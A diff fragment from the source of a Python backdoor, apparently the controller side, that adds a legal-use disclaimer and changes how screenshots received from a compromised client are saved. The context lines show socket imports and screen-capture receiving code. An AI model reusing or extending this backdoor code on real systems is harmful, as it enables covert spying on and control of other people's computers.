@@ -2,7 +2,10 @@
 Python backdoor by xp4xbox
 https://github.com/xp4xbox/Python-Backdoor
 https://www.instructables.com/id/Simple-Python-Backdoor/
+
 License: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
+
+NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
 '''
 
 import socket, os, time, threading, sys
@@ -195,7 +198,7 @@ def screenshot():
             intBuffer += strClientResponse[intCounter]
     intBuffer = int(intBuffer)
 
-    strFile = time.strftime("%Y%m%d%H%M%S" + ".png")
+    strFile = time.strftime("%Y%m%d%H%M%S" + ".bmp")
 
     ScrnData = recvall(intBuffer)  # get data and write it
     objPic = open(strFile, "wb")
